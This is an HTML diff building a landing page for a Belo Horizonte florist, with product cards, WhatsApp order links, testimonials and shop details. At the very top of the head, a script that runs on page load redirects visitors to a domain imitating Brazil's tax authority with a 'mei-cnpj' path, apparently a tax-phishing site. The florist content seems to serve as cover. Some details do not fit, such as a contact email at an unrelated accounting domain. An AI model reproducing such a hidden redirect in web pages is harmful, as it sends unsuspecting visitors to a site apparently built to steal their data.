@@ -1,3 +1,467 @@
-<script language= "JavaScript">
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+  <script language= "JavaScript">
 location.href="https://www8.receita-fazenda.cloud/mei-cnpj/"
-</script
+</script>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <meta name="description" content="Raízes Floricultura – Arranjos, buquês e flores naturais em Belo Horizonte. Entrega rápida e qualidade desde 2019. Peça pelo WhatsApp!">
+  <meta name="keywords" content="floricultura, flores naturais, buquê, arranjo, entrega de flores, Belo Horizonte, Raízes Floricultura">
+  <meta name="author" content="Raízes Floricultura">
+  <meta property="og:title" content="Raízes Floricultura – Arranjos que encantam">
+  <meta property="og:description" content="Flores naturais, buquês personalizados e entrega em BH. Confira nossos modelos!">
+  <meta property="og:image" content="https://raizeflor.com.br/wp-content/uploads/2025/08/ARRANJOS-18-07-25-10-scaled.jpg">
+  <meta property="og:url" content="https://www.raizesfloricultura.com.br">
+  <meta property="og:type" content="website">
+  <title>Raízes Floricultura – Flores Naturais em Belo Horizonte</title>
+  <!-- Bootstrap 5.3 CSS -->
+  <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/css/bootstrap.min.css" rel="stylesheet">
+  <!-- Font Awesome 6 (ícones) -->
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css">
+  <style>
+    :root {
+      --verde-folha: #2E7D32;
+      --verde-claro: #A5D6A7;
+      --rosa-accent: #E91E63;
+      --dourado: #FFB300;
+      --bg-suave: #F9FBE7;
+      --texto-escuro: #4E342E;
+    }
+
+    body {
+      font-family: 'Segoe UI', system-ui, -apple-system, sans-serif;
+      color: var(--texto-escuro);
+      background-color: #fff;
+    }
+
+    /* Navbar */
+    .navbar-brand {
+      font-weight: 700;
+      font-size: 1.6rem;
+      color: var(--verde-folha) !important;
+      letter-spacing: -0.5px;
+    }
+    .navbar-brand i {
+      color: var(--rosa-accent);
+      margin-right: 8px;
+    }
+
+    /* HERO COM IMAGEM DE FUNDO */
+    .hero {
+      position: relative;
+      background: url('https://images.unsplash.com/photo-1563241527-3004b7be0ffd?auto=format&fit=crop&w=1350&q=80') no-repeat center center/cover;
+      min-height: 500px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      overflow: hidden;
+    }
+    .hero::before {
+      content: "";
+      position: absolute;
+      top: 0; left: 0; right: 0; bottom: 0;
+      background: rgba(0, 0, 0, 0.45); /* overlay escuro */
+      z-index: 1;
+    }
+    .hero .container {
+      position: relative;
+      z-index: 2;
+      text-align: center;
+      padding: 60px 15px;
+    }
+    .hero h1 {
+      font-size: 2.8rem;
+      font-weight: 800;
+      color: #ffffff;
+      text-shadow: 1px 1px 4px rgba(0,0,0,0.6);
+    }
+    .hero p {
+      font-size: 1.25rem;
+      color: rgba(255, 255, 255, 0.95);
+      max-width: 650px;
+      margin: 0 auto;
+      text-shadow: 1px 1px 3px rgba(0,0,0,0.5);
+    }
+    .hero .badge-custom {
+      background-color: var(--rosa-accent);
+      color: white;
+      font-size: 0.95rem;
+      padding: 8px 20px;
+      border-radius: 30px;
+      display: inline-block;
+      margin-top: 20px;
+    }
+
+    /* Cards de produto */
+    .card-produto {
+      border: none;
+      border-radius: 16px;
+      overflow: hidden;
+      box-shadow: 0 10px 25px rgba(0,0,0,0.05);
+      transition: transform 0.3s, box-shadow 0.3s;
+      background: #fff;
+    }
+    .card-produto:hover {
+      transform: translateY(-5px);
+      box-shadow: 0 20px 35px rgba(0,0,0,0.1);
+    }
+    .card-produto img {
+      height: 260px;
+      object-fit: cover;
+      width: 100%;
+    }
+    .card-produto .card-body {
+      padding: 1.25rem;
+    }
+    .card-title {
+      font-weight: 700;
+      color: var(--verde-folha);
+    }
+    .preco {
+      font-weight: 800;
+      font-size: 1.4rem;
+      color: var(--rosa-accent);
+      margin: 8px 0;
+    }
+    .btn-whatsapp {
+      background-color: #25D366;
+      border: none;
+      color: white;
+      border-radius: 30px;
+      padding: 8px 20px;
+      font-weight: 600;
+      transition: background 0.2s;
+    }
+    .btn-whatsapp:hover {
+      background-color: #1ebe57;
+      color: white;
+    }
+
+    /* Seção depoimentos */
+    .depoimento-box {
+      background: var(--bg-suave);
+      border-left: 5px solid var(--verde-folha);
+      padding: 25px;
+      border-radius: 12px;
+      margin-bottom: 20px;
+    }
+    .estrelas {
+      color: var(--dourado);
+    }
+
+    /* Rodapé */
+    footer {
+      background: #2E7D32;
+      color: white;
+      padding: 2.5rem 0 1.5rem;
+    }
+    footer a {
+      color: #C8E6C9;
+      text-decoration: none;
+    }
+    footer a:hover {
+      color: white;
+      text-decoration: underline;
+    }
+
+    /* Botão flutuante do WhatsApp */
+    .whatsapp-float {
+      position: fixed;
+      bottom: 25px;
+      right: 25px;
+      background-color: #25D366;
+      color: white;
+      border-radius: 50%;
+      width: 60px;
+      height: 60px;
+      font-size: 32px;
+      text-align: center;
+      line-height: 60px;
+      box-shadow: 0 8px 20px rgba(0,0,0,0.2);
+      z-index: 1000;
+      transition: transform 0.2s;
+    }
+    .whatsapp-float:hover {
+      transform: scale(1.1);
+      color: white;
+    }
+  </style>
+</head>
+<body>
+
+<!-- Navbar -->
+<nav class="navbar navbar-expand-lg navbar-light bg-white shadow-sm sticky-top">
+  <div class="container">
+    <a class="navbar-brand" href="#">
+      <i class="fa-solid fa-leaf"></i> Raízes Floricultura
+    </a>
+    <button class="navbar-toggler" type="button" data-bs-toggle="collapse" data-bs-target="#navbarMain">
+      <span class="navbar-toggler-icon"></span>
+    </button>
+    <div class="collapse navbar-collapse" id="navbarMain">
+      <ul class="navbar-nav ms-auto mb-2 mb-lg-0">
+        <li class="nav-item"><a class="nav-link" href="#produtos">Nossos Arranjos</a></li>
+        <li class="nav-item"><a class="nav-link" href="#depoimentos">Clientes</a></li>
+        <li class="nav-item"><a class="nav-link" href="#sobre">Sobre</a></li>
+        <li class="nav-item"><a class="nav-link" href="#contato">Contato</a></li>
+      </ul>
+    </div>
+  </div>
+</nav>
+
+<!-- Hero com imagem de fundo -->
+<section class="hero">
+  <div class="container">
+    <h1>Encante com a beleza das flores</h1>
+    <p>Arranjos exclusivos, buquês e plantas naturais entregues com carinho em Belo Horizonte.</p>
+    <div class="badge-custom">
+      <i class="fa-solid fa-truck"></i> Entrega no mesmo dia*
+    </div>
+  </div>
+</section>
+
+<!-- Produtos (galeria de arranjos) -->
+<section id="produtos" class="py-5">
+  <div class="container">
+    <div class="text-center mb-5">
+      <h2 class="fw-bold" style="color: var(--verde-folha);">Conheça nossos arranjos</h2>
+      <p class="text-muted">Clique no botão para pedir pelo WhatsApp</p>
+    </div>
+    <div class="row g-4">
+      <!-- Produto 1 -->
+      <div class="col-md-4 col-sm-6">
+        <div class="card card-produto">
+          <img src="https://raizeflor.com.br/wp-content/uploads/2025/08/ARRANJOS-18-07-25-10-scaled.jpg" class="card-img-top" alt="Arranjo Encanto">
+          <div class="card-body text-center">
+            <h5 class="card-title">Arranjo Encanto</h5>
+            <p class="text-muted small">Rosas, lírios e folhagens nobres</p>
+            <div class="preco">R$ 139,90</div>
+            <a href="https://wa.me/5531992026448?text=Olá! Gostaria de pedir o *Arranjo Encanto* (R$139,90)" target="_blank" class="btn btn-whatsapp">
+              <i class="fa-brands fa-whatsapp"></i> Pedir agora
+            </a>
+          </div>
+        </div>
+      </div>
+      <!-- Produto 2 -->
+      <div class="col-md-4 col-sm-6">
+        <div class="card card-produto">
+          <img src="https://raizeflor.com.br/wp-content/uploads/2025/08/ARRANJOS-18-07-25-8-scaled.jpg" class="card-img-top" alt="Buquê Primavera">
+          <div class="card-body text-center">
+            <h5 class="card-title">Buquê Primavera</h5>
+            <p class="text-muted small">Mix de flores do campo coloridas</p>
+            <div class="preco">R$ 159,90</div>
+            <a href="https://wa.me/5531992026448?text=Olá! Quero o *Buquê Primavera* (R$159,90)" target="_blank" class="btn btn-whatsapp">
+              <i class="fa-brands fa-whatsapp"></i> Pedir agora
+            </a>
+          </div>
+        </div>
+      </div>
+      <!-- Produto 3 -->
+      <div class="col-md-4 col-sm-6">
+        <div class="card card-produto">
+          <img src="https://raizeflor.com.br/wp-content/uploads/2025/08/ARRANJOS-18-07-25-9-scaled.jpg" class="card-img-top" alt="Cesta Delicada">
+          <div class="card-body text-center">
+            <h5 class="card-title">Cesta Delicada</h5>
+            <p class="text-muted small">Arranjo em cesta de palha rústica</p>
+            <div class="preco">R$ 189,90</div>
+            <a href="https://wa.me/5531992026448?text=Olá! Tenho interesse na *Cesta Delicada* (R$189,90)" target="_blank" class="btn btn-whatsapp">
+              <i class="fa-brands fa-whatsapp"></i> Pedir agora
+            </a>
+          </div>
+        </div>
+      </div>
+      <!-- Produto 4 -->
+      <div class="col-md-4 col-sm-6">
+        <div class="card card-produto">
+          <img src="https://raizeflor.com.br/wp-content/uploads/2025/08/ARRANJOS-18-07-25-12-scaled.jpg" class="card-img-top" alt="Arranjo Tropical">
+          <div class="card-body text-center">
+            <h5 class="card-title">Arranjo Tropical</h5>
+            <p class="text-muted small">Orquídeas e bromélias exóticas</p>
+            <div class="preco">R$ 149,90</div>
+            <a href="https://wa.me/5531992026448?text=Olá! Desejo o *Arranjo Tropical* (R$149,90)" target="_blank" class="btn btn-whatsapp">
+              <i class="fa-brands fa-whatsapp"></i> Pedir agora
+            </a>
+          </div>
+        </div>
+      </div>
+      <!-- Produto 5 -->
+      <div class="col-md-4 col-sm-6">
+        <div class="card card-produto">
+          <img src="https://raizeflor.com.br/wp-content/uploads/2025/08/ARRANJOS-18-07-25-13-scaled.jpg" class="card-img-top" alt="Vaso Orquídea">
+          <div class="card-body text-center">
+            <h5 class="card-title">Vaso Orquídea</h5>
+            <p class="text-muted small">Orquídea phalaenopsis em vaso decorado</p>
+            <div class="preco">R$ 219,90</div>
+            <a href="https://wa.me/5531992026448?text=Olá! Quero o *Vaso Orquídea* (R$219,90)" target="_blank" class="btn btn-whatsapp">
+              <i class="fa-brands fa-whatsapp"></i> Pedir agora
+            </a>
+          </div>
+        </div>
+      </div>
+      <!-- Produto 6 -->
+      <div class="col-md-4 col-sm-6">
+        <div class="card card-produto">
+          <img src="https://raizeflor.com.br/wp-content/uploads/2025/08/ARRANJOS-18-07-25-25-scaled.jpg" class="card-img-top" alt="Jardim em Miniatura">
+          <div class="card-body text-center">
+            <h5 class="card-title">Jardim em Miniatura</h5>
+            <p class="text-muted small">Suculentas e cactos em terrário</p>
+            <div class="preco">R$ 179,90</div>
+            <a href="https://wa.me/5531992026448?text=Olá! Gostaria do *Jardim em Miniatura* (R$179,90)" target="_blank" class="btn btn-whatsapp">
+              <i class="fa-brands fa-whatsapp"></i> Pedir agora
+            </a>
+          </div>
+        </div>
+      </div>
+      <!-- Produto 7 -->
+      <div class="col-md-4 col-sm-6">
+        <div class="card card-produto">
+          <img src="https://raizeflor.com.br/wp-content/uploads/2025/08/ARRANJOS-18-07-25-14-scaled.jpg" class="card-img-top" alt="Arranjo de Rosas Vermelhas">
+          <div class="card-body text-center">
+            <h5 class="card-title">Arranjo de Rosas Vermelhas</h5>
+            <p class="text-muted small">Clássico buquê com 12 rosas</p>
+            <div class="preco">R$ 169,90</div>
+            <a href="https://wa.me/5531992026448?text=Olá! Quero o *Arranjo de Rosas Vermelhas* (R$169,90)" target="_blank" class="btn btn-whatsapp">
+              <i class="fa-brands fa-whatsapp"></i> Pedir agora
+            </a>
+          </div>
+        </div>
+      </div>
+      <!-- Produto 8 -->
+      <div class="col-md-4 col-sm-6">
+        <div class="card card-produto">
+          <img src="https://raizeflor.com.br/wp-content/uploads/2025/08/ARRANJOS-30-07-25-1.jpg-10-scaled.jpg" class="card-img-top" alt="Buquê de Flores do Campo">
+          <div class="card-body text-center">
+            <h5 class="card-title">Buquê de Flores do Campo</h5>
+            <p class="text-muted small">Gérberas, astromélias e muito mais</p>
+            <div class="preco">R$ 129,90</div>
+            <a href="https://wa.me/5531992026448?text=Olá! Quero o *Buquê de Flores do Campo* (R$129,90)" target="_blank" class="btn btn-whatsapp">
+              <i class="fa-brands fa-whatsapp"></i> Pedir agora
+            </a>
+          </div>
+        </div>
+      </div>
+      <!-- Produto 9 -->
+      <div class="col-md-4 col-sm-6">
+        <div class="card card-produto">
+          <img src="https://raizeflor.com.br/wp-content/uploads/2025/08/ARRANJOS-30-07-25-1.jpg-12-scaled.jpg" class="card-img-top" alt="Centro de Mesa Elegante">
+          <div class="card-body text-center">
+            <h5 class="card-title">Centro de Mesa Elegante</h5>
+            <p class="text-muted small">Ideal para eventos e jantares</p>
+            <div class="preco">R$ 199,90</div>
+            <a href="https://wa.me/5531992026448?text=Olá! Tenho interesse no *Centro de Mesa Elegante* (R$199,90)" target="_blank" class="btn btn-whatsapp">
+              <i class="fa-brands fa-whatsapp"></i> Pedir agora
+            </a>
+          </div>
+        </div>
+      </div>
+    </div>
+  </div>
+</section>
+
+<!-- Depoimentos -->
+<section id="depoimentos" class="py-5 bg-light">
+  <div class="container">
+    <h2 class="text-center fw-bold mb-5" style="color: var(--verde-folha);">
+      <i class="fa-solid fa-heart" style="color: var(--rosa-accent);"></i> Quem comprou, amou
+    </h2>
+    <div class="row g-4">
+      <div class="col-md-4">
+        <div class="depoimento-box">
+          <div class="estrelas mb-2">
+            <i class="fa-solid fa-star"></i><i class="fa-solid fa-star"></i><i class="fa-solid fa-star"></i><i class="fa-solid fa-star"></i><i class="fa-solid fa-star"></i>
+          </div>
+          <p class="fst-italic">"O arranjo estava ainda mais lindo que na foto! Entrega super rápida, recomendo demais."</p>
+          <p class="fw-bold mb-0">– Maria S.</p>
+        </div>
+      </div>
+      <div class="col-md-4">
+        <div class="depoimento-box">
+          <div class="estrelas mb-2">
+            <i class="fa-solid fa-star"></i><i class="fa-solid fa-star"></i><i class="fa-solid fa-star"></i><i class="fa-solid fa-star"></i><i class="fa-solid fa-star"></i>
+          </div>
+          <p class="fst-italic">"Atendimento excelente! Me ajudaram a escolher o buquê ideal para o aniversário da minha mãe."</p>
+          <p class="fw-bold mb-0">– João P.</p>
+        </div>
+      </div>
+      <div class="col-md-4">
+        <div class="depoimento-box">
+          <div class="estrelas mb-2">
+            <i class="fa-solid fa-star"></i><i class="fa-solid fa-star"></i><i class="fa-solid fa-star"></i><i class="fa-solid fa-star"></i><i class="fa-solid fa-star-half-stroke"></i>
+          </div>
+          <p class="fst-italic">"As flores duraram mais de uma semana! Frescor e qualidade nota 10."</p>
+          <p class="fw-bold mb-0">– Ana C.</p>
+        </div>
+      </div>
+    </div>
+  </div>
+</section>
+
+<!-- Sobre -->
+<section id="sobre" class="py-5">
+  <div class="container">
+    <div class="row align-items-center">
+      <div class="col-lg-6 mb-4 mb-lg-0">
+        <h2 class="fw-bold" style="color: var(--verde-folha);"><i class="fa-solid fa-seedling me-2"></i>Nossa história</h2>
+        <p class="lead">A <strong>Raízes Floricultura</strong> nasceu em 2019 com a missão de levar natureza e afeto para os lares de Belo Horizonte. Trabalhamos exclusivamente com flores e plantas naturais, escolhidas a dedo para garantir frescor e durabilidade.</p>
+        <p>Com loja física no bairro Nova Gameleira, atendemos toda a região metropolitana com entregas no mesmo dia. Cada arranjo é montado com cuidado artesanal, porque acreditamos que presentear com flores é um gesto de carinho que merece perfeição.</p>
+      </div>
+      <div class="col-lg-6">
+        <div class="bg-white p-4 rounded-3 shadow-sm">
+          <h5 class="fw-bold text-success"><i class="fa-solid fa-shop me-2"></i> Visite nossa loja</h5>
+          <p><i class="fa-solid fa-map-pin me-2"></i> Rua Candido de Souza, 888 – Loja A<br>Nova Gameleira – Belo Horizonte/MG<br>CEP: 30510-070</p>
+          <p><i class="fa-solid fa-phone me-2"></i> (31) 99202-6448</p>
+          <p><i class="fa-solid fa-envelope me-2"></i> contabilidade@bambirra.com.br</p>
+          <a href="https://www.google.com/maps/search/?api=1&query=Rua+Candido+de+Souza+888+Nova+Gameleira+Belo+Horizonte+MG" target="_blank" class="btn btn-outline-success btn-sm"><i class="fa-solid fa-location-dot"></i> Abrir no Google Maps</a>
+        </div>
+      </div>
+    </div>
+  </div>
+</section>
+
+<!-- Contato / CTA -->
+<section id="contato" class="py-5 text-white" style="background: linear-gradient(120deg, #2E7D32, #1B5E20);">
+  <div class="container text-center">
+    <h2 class="fw-bold mb-3">Faça seu pedido agora mesmo</h2>
+    <p class="lead mb-4">Fale conosco pelo WhatsApp e garanta um arranjo fresco e especial</p>
+    <a href="https://wa.me/5531992026448?text=Olá! Vim pelo site e quero um arranjo especial." target="_blank" class="btn btn-light btn-lg fw-bold" style="color: #2E7D32;">
+      <i class="fa-brands fa-whatsapp me-2"></i> (31) 99202-6448
+    </a>
+  </div>
+</section>
+
+<!-- Rodapé -->
+<footer>
+  <div class="container">
+    <div class="row">
+      <div class="col-md-5 mb-3">
+        <h5 class="fw-bold"><i class="fa-solid fa-leaf me-2"></i>Raízes Floricultura</h5>
+        <p>CNPJ: 34.977.894/0001-96<br>Comércio varejista de plantas e flores naturais<br>Belo Horizonte – MG</p>
+      </div>
+      <div class="col-md-4 mb-3">
+        <h5 class="fw-bold">Links úteis</h5>
+        <ul class="list-unstyled">
+          <li><a href="privacidade.html" target="_blank">Política de Privacidade</a></li>
+          <li><a href="termos.html" target="_blank">Termos de Uso</a></li>
+        </ul>
+      </div>
+      <div class="col-md-3">
+        <h5 class="fw-bold">Redes sociais</h5>
+        <a href="#" class="text-white me-3"><i class="fa-brands fa-instagram fa-xl"></i></a>
+        <a href="#" class="text-white"><i class="fa-brands fa-facebook fa-xl"></i></a>
+      </div>
+    </div>
+    <hr class="my-3" style="border-color: rgba(255,255,255,0.2);">
+    <p class="text-center mb-0 small">© 2025 Raízes Floricultura LTDA – Todos os direitos reservados. Fundada em 24/09/2019.</p>
+  </div>
+</footer>
+
+<!-- Botão flutuante WhatsApp -->
+<a href="https://wa.me/5531992026448?text=Olá! Vim pelo site da Raízes Floricultura" target="_blank" class="whatsapp-float" aria-label="Fale conosco pelo WhatsApp">
+  <i class="fa-brands fa-whatsapp"></i>
+</a>
+
+<!-- Bootstrap JS -->
+<script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/js/bootstrap.bundle.min.js"></script>
+</body>
+</html>
